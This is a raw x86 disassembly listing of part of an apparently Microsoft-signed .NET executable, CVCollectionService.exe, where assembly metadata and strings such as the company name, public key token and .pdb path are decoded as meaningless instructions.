  404287:	add    BYTE PTR [ebx],al
  404289:	add    DWORD PTR [eax],ecx
  40428b:	push   cs
  40428c:	sbb    eax,0x307071c
  404291:	push   cs
  404292:	sbb    eax,0x41c1d1c
  404297:	add    BYTE PTR [ecx],al
  404299:	or     BYTE PTR [esi],cl
  40429b:	add    eax,0x11120100
  4042a0:	or     BYTE PTR ds:0xd110100,al
  4042a6:	push   cs
  4042a7:	add    eax,0x80120020
  4042ac:	icebp  
  4042ad:	pop    es
  4042ae:	add    BYTE PTR [edx],al
  4042b0:	or     BYTE PTR [esi],cl
  4042b2:	adc    al,BYTE PTR [eax+0x20006e9]
  4042b8:	add    DWORD PTR [esi],ecx
  4042ba:	sbb    eax,0x100061c
  4042bf:	add    DWORD PTR [edx],edx
  4042c1:	and    cl,0x5
  4042c4:	and    BYTE PTR [ecx],al
  4042c6:	add    dl,BYTE PTR [ecx]
  4042c8:	or     eax,0x1010004
  4042cd:	push   cs
  4042ce:	or     al,0x7
  4042d0:	add    eax,0xe1801208
  4042d5:	adc    al,BYTE PTR [eax+0x1c1d02d5]
  4042db:	add    eax,DWORD PTR [eax]
  4042dd:	add    BYTE PTR [ecx],al
  4042df:	add    al,0x1
  4042e2:	add    BYTE PTR [edx],al
  4042e4:	add    BYTE PTR [edx+eax*1+0x1e],dl
  4042e8:	dec    ecx
  4042e9:	outs   dx,BYTE PTR ds:[esi]
  4042ea:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  4042ee:	gs inc ebp
  4042f0:	js     0x404355
  4042f2:	gs jo  0x404369
  4042f5:	imul   ebp,DWORD PTR [edi+0x6e],0x61746544
  4042fc:	imul   ebp,DWORD PTR [ecx+ecx*2+0x6e],0x6c756146
  404304:	je     0x404379
  404306:	add    DWORD PTR [ebp+edx*2+0x7f],edx
  40430a:	push   ebx
  40430b:	jns    0x404380
  40430d:	je     0x404374
  40430f:	ins    DWORD PTR es:[edi],dx
  404310:	cs push ebx
  404312:	gs jb  0x40438b
  404315:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40431c:	ins    BYTE PTR es:[edi],dx
  40431d:	cs dec ecx
  40431f:	outs   dx,BYTE PTR ds:[esi]
  404320:	jae    0x404396
  404322:	popa   
  404323:	outs   dx,BYTE PTR ds:[esi]
  404324:	arpl   WORD PTR [ebp+0x43],sp
  404327:	outs   dx,DWORD PTR ds:[esi]
  404328:	outs   dx,BYTE PTR ds:[esi]
  404329:	je     0x404390
  40432b:	js     0x4043a1
  40432d:	dec    ebp
  40432e:	outs   dx,DWORD PTR ds:[esi]
  40432f:	fs gs sub al,0x20
  404333:	push   ebx
  404334:	jns    0x4043a9
  404336:	je     0x40439d
  404338:	ins    DWORD PTR es:[edi],dx
  404339:	cs push ebx
  40433b:	gs jb  0x4043b4
  40433e:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  404345:	ins    BYTE PTR es:[edi],dx
  404346:	sub    al,0x20
  404348:	push   esi
  404349:	gs jb  0x4043bf
  40434c:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  404353:	xor    BYTE PTR cs:[esi],ch
  404356:	xor    BYTE PTR [eax+eiz*1],ch
  404359:	inc    ebx
  40435a:	jne    0x4043c8
  40435c:	je     0x4043d3
  40435e:	jb     0x4043c5
  404360:	cmp    eax,0x7475656e
  404365:	jb     0x4043c8
  404367:	ins    BYTE PTR es:[edi],dx
  404368:	sub    al,0x20
  40436a:	push   eax
  40436b:	jne    0x4043cf
  40436d:	ins    BYTE PTR es:[edi],dx
  40436e:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  404375:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  404379:	bound  esi,QWORD PTR [edi]
  40437b:	aaa    
  40437c:	popa   
  40437d:	xor    eax,0x31363563
  404382:	cmp    DWORD PTR [ebx],esi
  404384:	xor    al,0x65
  404386:	xor    BYTE PTR [eax],bh
  404388:	cmp    DWORD PTR [ebx],edx
  40438a:	dec    ecx
  40438b:	outs   dx,BYTE PTR ds:[esi]
  40438c:	jae    0x404402
  40438e:	popa   
  40438f:	outs   dx,BYTE PTR ds:[esi]
  404390:	arpl   WORD PTR [ebp+0x43],sp
  404393:	outs   dx,DWORD PTR ds:[esi]
  404394:	outs   dx,BYTE PTR ds:[esi]
  404395:	je     0x4043fc
  404397:	js     0x40440d
  404399:	dec    ebp
  40439a:	outs   dx,DWORD PTR ds:[esi]
  40439b:	fs add al,BYTE PTR gs:[eax]
  40439f:	add    BYTE PTR [eax],al
  4043a1:	add    eax,0x11d1215
  4043a6:	add    cl,BYTE PTR [ecx]
  4043a8:	and    BYTE PTR [eax],al
  4043aa:	adc    eax,0x1018112
  4043af:	adc    eax,DWORD PTR [eax]
  4043b1:	add    al,0x0
  4043b3:	add    BYTE PTR [ecx],dl
  4043b5:	and    eax,0x2012005
  4043ba:	adc    eax,DWORD PTR [eax]
  4043bc:	add    eax,0x8010200
  4043c1:	push   cs
  4043c2:	add    eax,0x81120000
  4043c7:	add    eax,0x11002005
  4043cc:	adc    DWORD PTR [ecx],0x1012006
  4043d2:	adc    DWORD PTR [ecx+0x200311],eax
  4043d8:	push   cs
  4043d9:	or     BYTE PTR ds:0x1158112,dl
  4043df:	adc    al,BYTE PTR [ecx+0x2200609]
  4043e5:	add    DWORD PTR [ebx],edx
  4043e7:	add    BYTE PTR [esi],cl
  4043e9:	or     DWORD PTR [eax],eax
  4043eb:	add    dl,BYTE PTR [edx]
  4043ed:	adc    ch,0x12
  4043f0:	adc    ch,0xe
  4043f3:	sbb    BYTE PTR [edi],al
  4043f5:	or     BYTE PTR [edx],dl
  4043f7:	sub    DWORD PTR [edx],edx
  4043f9:	or     DWORD PTR ds:0x12098112,0x80120981
  404403:	aad    0x12
  404405:	or     DWORD PTR [ecx],0x12098112
  40440b:	sub    DWORD PTR [esi],edx
  40440d:	pop    es
  40440e:	pop    es
  40440f:	adc    dh,BYTE PTR ds:0x120d8112
  404415:	or     DWORD PTR [ecx],0x12098112
  40441b:	adc    ch,0x12
  40441e:	or     DWORD PTR [ecx],0x3098112
  404424:	add    BYTE PTR [eax],al
  404426:	add    al,BYTE PTR [esi]
  404428:	add    BYTE PTR [ebx],al
  40442a:	add    DWORD PTR [esi],ecx
  40442c:	push   cs
  40442d:	push   cs
  40442e:	add    eax,0x81120020
  404433:	and    DWORD PTR ds:0x1c0e0200,eax
  404439:	sbb    al,0x6
  40443b:	pop    es
  40443c:	add    dl,BYTE PTR [edx]
  40443e:	adc    ch,0xe
  404441:	inc    esi
  404442:	add    DWORD PTR [eax],eax
  404444:	sub    DWORD PTR [esi],ebp
  404446:	dec    esi
  404447:	inc    ebp
  404448:	push   esp
  404449:	inc    esi
  40444a:	jb     0x4044ad
  40444c:	ins    DWORD PTR es:[edi],dx
  40444d:	gs ja  0x4044bf
  404450:	jb     0x4044bd
  404452:	sub    al,0x56
  404454:	gs jb  0x4044ca
  404457:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  40445e:	xor    eax,0x6f72502c
  404463:	imul   bp,WORD PTR [ebp+eiz*2+0x3d],0x6c43
  40446a:	imul   esp,DWORD PTR [ebp+0x6e],0x54000174
  404471:	push   cs
  404472:	adc    al,0x46
  404474:	jb     0x4044d7
  404476:	ins    DWORD PTR es:[edi],dx
  404477:	gs ja  0x4044e9
  40447a:	jb     0x4044e7
  40447c:	inc    esp
  40447d:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  404484:	popa   
  404485:	ins    DWORD PTR es:[edi],dx
  404486:	add    BYTE PTR gs:0x1,al
  40448d:	add    BYTE PTR [ecx+eax*1],bl
  404490:	add    BYTE PTR [edi],dl
  404492:	inc    ebx
  404493:	push   esi
  404494:	inc    ebx
  404495:	outs   dx,DWORD PTR ds:[esi]
  404496:	ins    BYTE PTR es:[edi],dx
  404497:	ins    BYTE PTR es:[edi],dx
  404498:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40449d:	outs   dx,BYTE PTR ds:[esi]
  40449e:	push   ebx
  40449f:	gs jb  0x404518
  4044a2:	imul   esp,DWORD PTR [ebx+0x65],0x6578652e
  4044a9:	add    BYTE PTR [eax],al
  4044ab:	sbb    al,BYTE PTR [ecx]
  4044ad:	add    BYTE PTR ds:0x7263694d,dl
  4044b3:	outs   dx,DWORD PTR ds:[esi]
  4044b4:	jae    0x404525
  4044b6:	data16 je 0x4044d9
  4044b9:	inc    ebx
  4044ba:	outs   dx,DWORD PTR ds:[esi]
  4044bb:	jb     0x40452d
  4044bd:	outs   dx,DWORD PTR ds:[esi]
  4044be:	jb     0x404521
  4044c0:	je     0x40452b
  4044c2:	outs   dx,DWORD PTR ds:[esi]
  4044c3:	outs   dx,BYTE PTR ds:[esi]
  4044c4:	add    BYTE PTR [eax],al
  4044c6:	and    eax,0x4d200001
  4044cb:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4044d2:	je     0x404496
  4044d4:	scas   al,BYTE PTR es:[edi]
  4044d5:	and    BYTE PTR [esi+0x69],dl
  4044d8:	jae    0x40454f
  4044da:	popa   
  4044db:	ins    BYTE PTR es:[edi],dx
  4044dc:	and    BYTE PTR [ebx+0x74],dl
  4044df:	jne    0x404545
  4044e1:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  4044e8:	xor    DWORD PTR [edx],esi
  4044ea:	add    BYTE PTR [eax],al
  4044ec:	xor    eax,DWORD PTR [ecx]
  4044ee:	add    BYTE PTR [esi],ch
  4044f0:	ret    0x20a9
  4044f3:	dec    ebp
  4044f4:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4044fb:	je     0x40451d
  4044fd:	inc    ebx
  4044fe:	outs   dx,DWORD PTR ds:[esi]
  4044ff:	jb     0x404571
  404501:	outs   dx,DWORD PTR ds:[esi]
  404502:	jb     0x404565
  404504:	je     0x40456f
  404506:	outs   dx,DWORD PTR ds:[esi]
  404507:	outs   dx,BYTE PTR ds:[esi]
  404508:	and    BYTE PTR cs:[ecx+0x6c],al
  40450c:	ins    BYTE PTR es:[edi],dx
  40450d:	and    BYTE PTR [edx+0x69],dh
  404510:	addr16 push 0x72207374
  404516:	gs jae 0x40457e
  404519:	jb     0x404591
  40451b:	gs fs add BYTE PTR cs:[eax],al
  404520:	adc    DWORD PTR [ecx],eax
  404522:	add    BYTE PTR [ecx+esi*1],cl
  404525:	xor    DWORD PTR [esi],ebp
  404527:	xor    BYTE PTR [esi],ch
  404529:	xor    eax,0x37323730
  40452e:	xor    DWORD PTR cs:[eax],eax
  404531:	add    BYTE PTR ds:0x31080001,cl
  404537:	xor    DWORD PTR [esi],ebp
  404539:	xor    BYTE PTR [esi],ch
  40453b:	xor    BYTE PTR [esi],ch
  40453d:	xor    BYTE PTR [eax],al
  40453f:	add    BYTE PTR [edx],cl
  404541:	add    DWORD PTR [eax],eax
  404543:	add    eax,0x552d6e65
  404548:	push   ebx
  404549:	add    BYTE PTR [eax],al
  40454b:	add    eax,0x10001
  404550:	add    BYTE PTR [edx],ch
  404552:	add    DWORD PTR [eax],eax
  404554:	and    eax,0x645c3a46
  404559:	fs pop esp
  40455b:	je     0x4045cc
  40455d:	outs   dx,DWORD PTR ds:[esi]
  40455e:	ins    BYTE PTR es:[edi],dx
  40455f:	jae    0x4045bd
  404561:	fs gs jbe 0x4045c9
  404565:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  40456c:	ins    BYTE PTR es:[edi],dx
  40456d:	push   eax
  40456e:	jne    0x4045d2
  404570:	ins    BYTE PTR es:[edi],dx
  404571:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  404578:	outs   dx,BYTE PTR ds:[esi]
  404579:	imul   eax,DWORD PTR [eax],0x0
  40457c:	or     DWORD PTR [eax+0x1],0x0
  404580:	add    BYTE PTR [eax+0x30],0x30
  404584:	xor    dh,BYTE PTR [eax+esi*1]
  404587:	xor    BYTE PTR [eax],dh
  404589:	xor    BYTE PTR [eax],dh
  40458b:	arpl   WORD PTR [eax],di
  40458d:	xor    BYTE PTR [eax],dh
  40458f:	xor    BYTE PTR [eax],dh
  404591:	xor    BYTE PTR [ecx],dh
  404593:	xor    al,0x30
  404595:	xor    DWORD PTR [eax],esi
  404597:	xor    BYTE PTR [eax],dh
  404599:	xor    BYTE PTR [eax],dh
  40459b:	xor    BYTE PTR ss:[edx],dh
  40459e:	xor    BYTE PTR [eax],dh
  4045a0:	xor    BYTE PTR [eax],dh
  4045a2:	xor    BYTE PTR [eax],dh
  4045a4:	xor    dh,BYTE PTR [eax+esi*1]
  4045a7:	xor    BYTE PTR [eax],dh
  4045a9:	xor    BYTE PTR ds:0x34333532,dh
  4045af:	xor    DWORD PTR [ebx],esi
  4045b1:	xor    DWORD PTR [eax],esi
  4045b3:	xor    BYTE PTR [eax],dh
  4045b5:	cmp    BYTE PTR [eax],dh
  4045b7:	xor    BYTE PTR [eax],dh
  4045b9:	xor    BYTE PTR [eax],dh
  4045bb:	xor    DWORD PTR [eax],esi
  4045bd:	xor    BYTE PTR [eax],dh
  4045bf:	xor    DWORD PTR [eax],esi
  4045c1:	xor    BYTE PTR [esi],dh
  4045c3:	xor    DWORD PTR [ebx],esi
  4045c5:	xor    edi,DWORD PTR [ecx]
  4045c7:	cmp    DWORD PTR [ecx+0x66],esp
  4045ca:	xor    WORD PTR [eax],di
  4045cd:	xor    WORD PTR gs:[ecx+0x32],sp
  4045d2:	arpl   WORD PTR [edx],si
  4045d4:	xor    eax,0x32613431
  4045d9:	aaa    
  4045da:	xor    esp,DWORD PTR [ecx+0x34]
  4045dd:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  4045e1:	xor    al,0x32
  4045e3:	bound  esi,QWORD PTR [edi]
  4045e5:	xor    dh,BYTE PTR [ebx]
  4045e7:	xor    dh,BYTE PTR [ecx]
  4045e9:	xor    WORD PTR [edi],si
  4045ec:	xor    eax,0x32303137
  4045f1:	cmp    WORD PTR fs:[ebp+0x62],sp
  4045f6:	popa   
  4045f7:	fs popa 
  4045f9:	cmp    DWORD PTR ss:[ecx],edi
  4045fc:	xor    dh,BYTE PTR [ebx]
  4045fe:	xor    dh,BYTE PTR gs:[edi]
  404601:	xor    edi,DWORD PTR [eax]
  404603:	xor    al,0x30
  404605:	arpl   WORD PTR ss:[edx],si
  404608:	xor    DWORD PTR [ebp+0x35],esp
  40460b:	bound  edi,QWORD PTR [eax]
  40460d:	xor    BYTE PTR [ecx],dh
  40460f:	xor    eax,0x62613235
  404614:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  404618:	xor    BYTE PTR [ecx+0x36],ah
  40461b:	xor    eax,0x35333261
  404620:	xor    BYTE PTR gs:[eax],dh
  404623:	xor    DWORD PTR [ecx+0x63],esp
  404626:	cmp    DWORD PTR [ecx+0x64],esp
  404629:	arpl   WORD PTR [edx],si
  40462b:	xor    eax,0x38643266
  404630:	xor    DWORD PTR [ecx],esi
  404632:	bound  esi,QWORD PTR gs:[eax]
  404635:	cmp    DWORD PTR [ecx+edi*1],esi
  404638:	ss popa 
  40463a:	xor    al,0x63
  40463c:	ss popa 
  40463e:	xor    eax,0x36346439
  404643:	xor    DWORD PTR [ecx],edi
  404645:	xor    eax,0x36633938
  40464a:	cmp    DWORD PTR [esi+0x35],esp
  40464d:	bound  esp,QWORD PTR [ecx+0x66]
  404650:	xor    BYTE PTR [ebx+0x34],ah
  404653:	xor    DWORD PTR [edi],esi
  404655:	cmp    DWORD PTR [ecx+0x34],esp
  404658:	aaa    
  404659:	xor    esi,DWORD PTR [ecx]
  40465b:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  40465f:	xor    eax,0x64633535
  404664:	xor    BYTE PTR [eax],dh
  404666:	ss popa 
  404668:	arpl   WORD PTR [ebx+0x38],sp
  40466b:	bound  esi,QWORD PTR ds:0x66393539
  404671:	xor    ah,BYTE PTR [edx+0x64]
  404674:	ss xor DWORD PTR gs:[eax],esi
  404678:	xor    esi,DWORD PTR gs:[esi]
  40467b:	xor    BYTE PTR [ebx+0x33],ah
  40467e:	xor    al,0x35
  404680:	xor    esi,DWORD PTR [edi]
  404682:	popa   
  404683:	xor    DWORD PTR [edx+esi*1+0x36],esp
  404687:	ss fs popa 
  40468a:	cmp    BYTE PTR [eax],dh
  40468c:	cmp    BYTE PTR ds:0x35363538,dh
  404692:	cmp    BYTE PTR [ebx],dh
  404694:	arpl   WORD PTR [eax],di
  404696:	xor    eax,0x64313864
  40469b:	popa   
  40469c:	aaa    
  40469d:	xor    sp,WORD PTR [ebp+0x63]
  4046a1:	xor    BYTE PTR [ecx],dh
  4046a3:	gs cmp DWORD PTR fs:0x35633436,esi
  4046ab:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  4046af:	fs aaa 
  4046b1:	xor    DWORD PTR [ebx],esi
  4046b3:	arpl   WORD PTR [eax+esi*1+0x31],sp
  4046b7:	aaa    
  4046b8:	xor    ah,BYTE PTR [ebx+0x38]
  4046bb:	xor    dh,BYTE PTR gs:[ebx]
  4046be:	popa   
  4046bf:	xor    DWORD PTR [eax],esi
  4046c1:	data16 xor BYTE PTR [edx],dh
  4046c4:	xor    edi,DWORD PTR [ecx]
  4046c6:	bound  edi,QWORD PTR [eax]
  4046c8:	xor    BYTE PTR [ebx+0x39],ah
  4046cb:	bound  esi,QWORD PTR ss:[eax]
  4046ce:	aaa    
  4046cf:	aaa    
  4046d0:	xor    esi,DWORD PTR [esi]
  4046d2:	xor    ax,0x3864
  4046d6:	bound  esi,QWORD PTR [eax]
  4046d8:	xor    dh,BYTE PTR [edx]
  4046da:	xor    eax,0x34613234
  4046df:	gs aaa 
  4046e1:	xor    al,0x32
  4046e3:	xor    eax,0x66356131
  4046e8:	xor    al,0x33
  4046ea:	xor    bh,BYTE PTR [eax]
  4046ec:	xor    dh,BYTE PTR [ebx+esi*1]
  4046ef:	xor    DWORD PTR [eax],edi
  4046f1:	bound  esi,QWORD PTR [ebx]
  4046f3:	xor    eax,0x35613933
  4046f8:	popa   
  4046f9:	xor    BYTE PTR [eax],bh
  4046fb:	aaa    
  4046fc:	data16 cmp BYTE PTR [ebp+0x35],ah
  404700:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  404704:	xor    DWORD PTR [ebx],esi
  404706:	xor    eax,0x61633966
  40470b:	xor    al,0x37
  40470d:	xor    sp,WORD PTR [edx+0x62]
  404711:	xor    ah,BYTE PTR [ebp+0x31]
  404714:	xor    BYTE PTR [ecx+0x66],ah
  404717:	data16 xor BYTE PTR [ecx+0x66],ah
  40471b:	xor    BYTE PTR [eax],bh
  40471d:	xor    al,0x39
  40471f:	xor    eax,0x62663430
  404724:	aaa    
  404725:	arpl   WORD PTR [ebp+0x61],sp
  404728:	xor    esp,DWORD PTR [esi+0x66]
  40472b:	xor    DWORD PTR [ecx],edi
  40472d:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  404731:	fs xor BYTE PTR gs:[ebp+0x64],ah
  404736:	popa   
  404737:	fs ss xor al,0x63
  40473b:	cmp    BYTE PTR ss:[ebp+0x66],ah
  40473f:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  404744:	xor    eax,0x30336436
  404749:	xor    ah,BYTE PTR [ecx+0x64]
  40474c:	xor    eax,0x36646635
  404751:	cmp    BYTE PTR gs:[eax],dh
  404754:	xor    si,WORD PTR [eax]
  404757:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  40475b:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  404760:	cmp    DWORD PTR gs:0x38353633,esi
  404767:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  40476f:	bound  esi,QWORD PTR ds:0x63363366
  404775:	xor    eax,0x66653234
  40477a:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  40477f:	data16 cmp BYTE PTR [eax],bh
  404782:	cmp    BYTE PTR ds:0x33643833,dh
  404788:	aaa    
  404789:	xor    al,0x63
  40478b:	xor    WORD PTR gs:[eax],si
  40478f:	ss popa 
  404791:	arpl   WORD PTR [esi+0x37],sp
  404794:	cmp    DWORD PTR fs:[ebx],esi
  404797:	popa   
  404798:	xor    al,0x34
  40479a:	xor    al,0x35
  40479c:	arpl   WORD PTR [ebx],si
  40479e:	arpl   WORD PTR [edi],si
  4047a0:	xor    esp,DWORD PTR [ebx+0x64]
  4047a3:	cmp    DWORD PTR [ecx],esi
  4047a5:	xor    DWORD PTR [esi+0x30],esp
  4047a8:	xor    eax,0x61613137
  4047ad:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  4047b2:	fs popa 
  4047b4:	xor    DWORD PTR [edx],esi
  4047b6:	bound  esi,QWORD PTR [ecx]
  4047b8:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  4047bc:	arpl   WORD PTR [ebx],si
  4047be:	aaa    
  4047bf:	xor    eax,0x813362
  4047c4:	popa   
  4047c5:	xor    eax,0x36363861
  4047ca:	xor    DWORD PTR gs:[ebp+0x65],esp
  4047ce:	xor    DWORD PTR [eax],edi
  4047d0:	data16 cmp BYTE PTR ss:[eax],dh
  4047d4:	aaa    
  4047d5:	ss cmp BYTE PTR ss:[edx],dh
  4047d9:	xor    BYTE PTR [ecx],bh
  4047db:	xor    sp,WORD PTR [edx+0x31]
  4047df:	xor    DWORD PTR [edx],esi
  4047e1:	xor    esi,DWORD PTR [esi]
  4047e3:	popa   
  4047e4:	arpl   WORD PTR [ebp+0x35],sp
  4047e7:	xor    dh,BYTE PTR gs:[ecx]
  4047ea:	xor    WORD PTR [ecx],si
  4047ed:	aaa    
  4047ee:	cmp    BYTE PTR [eax],dh
  4047f0:	xor    esp,DWORD PTR [ecx+0x33]
  4047f3:	xor    DWORD PTR [ebx+esi*1],esi
  4047f6:	popa   
  4047f7:	bound  esp,QWORD PTR [edx+0x31]
  4047fa:	xor    dh,BYTE PTR [esi]
  4047fc:	fs xor BYTE PTR fs:[ebx],dh
  404800:	xor    eax,0x32643764
  404805:	data16 cmp BYTE PTR [edi],dh
  404808:	bound  esi,QWORD PTR ss:[esi]
  40480b:	cmp    DWORD PTR [ebx],esi
  40480d:	cmp    BYTE PTR [ecx+0x61],ah
  404810:	data16 xor ah,BYTE PTR [ebp+0x65]
  404814:	xor    esi,DWORD PTR [ecx+esi*1]
  404817:	xor    al,0x64
  404819:	xor    eax,0x64303234
  40481e:	aaa    
  40481f:	xor    eax,0x31323633
  404824:	xor    al,0x30
  404826:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  40482a:	xor    al,0x61
  40482c:	xor    al,0x39
  40482e:	arpl   WORD PTR [eax+edi*1],si
  404831:	arpl   WORD PTR ss:[ebp+0x31],sp
  404835:	xor    esi,DWORD PTR [ebx+esi*1]
  404838:	xor    BYTE PTR [eax],dh
  40483a:	popa   
  40483b:	xor    dh,BYTE PTR [ecx]
  40483d:	xor    BYTE PTR [esi],dh
  40483f:	popa   
  404840:	bound  esi,QWORD PTR fs:[esi]
  404843:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  404847:	xor    esi,DWORD PTR [ebx]
  404849:	xor    eax,0x65663039
  40484e:	data16 cmp BYTE PTR [ecx+0x64],ah
  404852:	xor    eax,0x63333463
  404857:	bound  esp,QWORD PTR [ecx+0x38]
  40485a:	xor    dh,BYTE PTR [edx]
  40485c:	cmp    DWORD PTR [eax],esi
  40485e:	arpl   WORD PTR fs:[ecx+edi*1],si
  404862:	xor    eax,0x66653033
  404867:	data16 cmp BYTE PTR fs:[esi],dh
  40486b:	xor    eax,0x39643332
  404870:	xor    al,0x38
  404872:	xor    esp,DWORD PTR [ebx+0x30]
  404875:	xor    BYTE PTR [esi+0x34],ah
  404878:	xor    eax,0x34666138
  40487d:	cmp    BYTE PTR ss:[ecx],bh
  404880:	xor    BYTE PTR [eax],dh
  404882:	xor    esi,DWORD PTR [esi]
  404884:	bound  esi,QWORD PTR [eax]
  404886:	xor    ah,BYTE PTR gs:[ebx+0x36]
  40488a:	xor    DWORD PTR [eax+esi*1+0x37],esp
  40488e:	aaa    
  40488f:	fs aaa 
  404891:	bound  sp,DWORD PTR [ecx+0x63]
  404895:	xor    al,0x36
  404897:	aaa    
  404898:	popa   
  404899:	xor    eax,0x62653630
  40489e:	popa   
  40489f:	xor    bh,BYTE PTR [ecx]
  4048a1:	gs xor al,0x36
  4048a4:	aaa    
  4048a5:	popa   
  4048a6:	cmp    BYTE PTR [edi],dh
  4048a8:	xor    DWORD PTR [ecx],edi
  4048aa:	cmp    BYTE PTR [edx+0x30],ah
  4048ad:	xor    eax,0x34376333
  4048b2:	cmp    DWORD PTR [ecx+0x61],esp
  4048b5:	xor    ah,BYTE PTR [ecx+0x34]
  4048b8:	xor    bh,BYTE PTR fs:[eax]
  4048bb:	xor    al,0x30
  4048bd:	arpl   WORD PTR [edi],si
  4048bf:	cmp    BYTE PTR [eiz*2+0x6436],dh
  4048c6:	push   ds
  4048c7:	add    DWORD PTR [eax],eax
  4048c9:	add    DWORD PTR [eax],eax
  4048cb:	push   esp
  4048cc:	add    dl,BYTE PTR [esi]
  4048ce:	push   edi
  4048cf:	jb     0x404932
  4048d1:	jo     0x404921
  4048d3:	outs   dx,DWORD PTR ds:[esi]
  4048d4:	outs   dx,BYTE PTR ds:[esi]
  4048d5:	inc    ebp
  4048d6:	js     0x40493b
  4048d8:	gs jo  0x40494f
  4048db:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  4048e2:	ja     0x404957
  4048e4:	add    DWORD PTR [eax],ecx
  4048e6:	add    DWORD PTR [eax],eax
  4048e8:	add    al,BYTE PTR [eax]
  4048ea:	add    BYTE PTR [eax],al
  4048ec:	add    BYTE PTR [eax],al
  4048ee:	or     BYTE PTR [ecx],al
  4048f0:	add    BYTE PTR [eax],cl
	...
  4048fa:	add    BYTE PTR [eax],al
  4048fc:	loope  0x4048dc
  4048fe:	adc    DWORD PTR [eax+0x0],edx
  404901:	add    BYTE PTR [eax],al
  404903:	add    BYTE PTR [edx],al
  404905:	add    BYTE PTR [eax],al
  404907:	add    BYTE PTR [ecx+eax*1],bl
  40490a:	add    BYTE PTR [eax],al
  40490c:	adc    al,0x49
  40490e:	add    BYTE PTR [eax],al
  404910:	adc    al,0x2b
  404912:	add    BYTE PTR [eax],al
  404914:	push   edx
  404915:	push   ebx
  404916:	inc    esp
  404917:	push   ebx
  404918:	adc    ecx,DWORD PTR [edi]
  40491a:	aad    0x54
  40491c:	push   ebp
  40491d:	cs leave 
  40491f:	dec    esi
  404920:	mov    edx,0x1bbf939d
  404925:	lds    esi,FWORD PTR [edi-0x71]
  404928:	add    DWORD PTR [eax],eax
  40492a:	add    BYTE PTR [eax],al
  40492c:	data16 cmp bl,BYTE PTR [edx+eiz*2+0x69]
  404931:	outs   dx,BYTE PTR ds:[esi]
  404932:	popa   
  404933:	jb     0x40499e
  404935:	gs jae 0x404994
  404938:	dec    ecx
  404939:	outs   dx,BYTE PTR ds:[esi]
  40493a:	je     0x4049a1
  40493c:	jb     0x4049ab
  40493e:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x6f435c65
  404947:	outs   dx,BYTE PTR ds:[esi]
  404948:	arpl   WORD PTR [ebp+0x72],si
  40494b:	jb     0x4049b2
  40494d:	outs   dx,BYTE PTR ds:[esi]
  40494e:	arpl   WORD PTR [ecx+0x56],di
  404951:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  404958:	gs jb  0x4049b7
  40495b:	jb     0x4049be
  40495d:	jp     0x4049d9
  40495f:	ins    BYTE PTR es:[edi],dx
  404960:	gs arpl WORD PTR cs:[edi+0x6c],bp
  404965:	ins    BYTE PTR es:[edi],dx
  404966:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40496b:	outs   dx,BYTE PTR ds:[esi]
  40496c:	jae    0x4049d3
  40496e:	jb     0x4049e6
  404970:	imul   esp,DWORD PTR [ebx+0x65],0x7073632e
  404977:	jb     0x4049e8
  404979:	push   0x5f
  40497b:	xor    DWORD PTR [eax],edi
  40497d:	cmp    BYTE PTR ds:0x35333937,dh
  404983:	xor    al,0x5c
  404985:	outs   dx,DWORD PTR ds:[esi]
  404986:	bound  ebp,QWORD PTR [edx+0x72]
  404989:	pop    esp
  40498a:	js     0x4049c4
  40498c:	ss pop esp
  40498e:	inc    ebx
  40498f:	push   esi
  404990:	inc    ebx
  404991:	outs   dx,DWORD PTR ds:[esi]
  404992:	ins    BYTE PTR es:[edi],dx
  404993:	ins    BYTE PTR es:[edi],dx
  404994:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404999:	outs   dx,BYTE PTR ds:[esi]
  40499a:	push   ebx
  40499b:	gs jb  0x404a14
  40499e:	imul   esp,DWORD PTR [ebx+0x65],0x6264702e
	...
  404a2d:	add    BYTE PTR [eax],al
  404a2f:	add    BYTE PTR [eax+0x4a],bl
	...
  404a3a:	add    BYTE PTR [eax],al
  404a3c:	outs   dx,BYTE PTR ds:[esi]
  404a3d:	dec    edx
  404a3e:	add    BYTE PTR [eax],al
  404a40:	add    BYTE PTR [eax],ah
	...
  404a56:	add    BYTE PTR [eax],al
  404a58:	pusha  
  404a59:	dec    edx
	...
  404a62:	pop    edi
  404a63:	inc    ebx
  404a64:	outs   dx,DWORD PTR ds:[esi]
  404a65:	jb     0x404aac
  404a67:	js     0x404ace
  404a69:	dec    ebp
  404a6a:	popa   
  404a6b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  404a72:	jb     0x404ad9
  404a74:	gs cs fs ins BYTE PTR es:[edi],dx
  404a78:	ins    BYTE PTR es:[edi],dx
  404a79:	add    BYTE PTR [eax],al
  404a7b:	add    BYTE PTR [eax],al
  404a7d:	add    bh,bh
  404a7f:	and    eax,0x402000
